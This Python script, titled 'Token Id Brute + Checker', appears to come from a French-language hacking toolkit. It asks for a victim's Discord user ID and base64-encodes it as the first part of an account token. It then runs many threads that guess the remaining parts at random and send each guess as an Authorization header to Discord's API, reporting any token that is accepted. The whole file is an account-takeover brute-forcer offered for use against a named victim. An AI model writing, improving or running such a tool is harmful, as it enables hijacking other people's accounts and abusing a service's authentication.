from Options.Options import *

import base64
import threading
import random
import string
import requests
import colorama
from colorama import Fore
colorama.init()

TitrePage("Token Id Brute + Checker")

idtoken = base64.b64encode((input(f"{couleur.RED}[?] | Victime ID -> {couleur.RESET}")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
try:
 thrd =  input(f"{couleur.RED}\n[?] | Threads -> {couleur.RESET}")
except:
 ErreurNombre()

def bruhmoment():
    while idtoken == idtoken:
        try:
         token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        except:
         ErreurId()
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(f"{couleur.GREEN}[X] | {couleur.CYAN}{token}{couleur.GREEN} | Token Found{couleur.RESET}")

        else:
                print(f"{couleur.RED}[X] | {couleur.CYAN}{token}{couleur.RED} | Token Invalid{couleur.RESET}")

threads = []
try:
 for _ in range(int(thrd)):
    t = threading.Thread(target=bruhmoment)
    t.start()
    threads.append(t)
except:
 ErreurNombre()

for thread in threads:
    thread.join()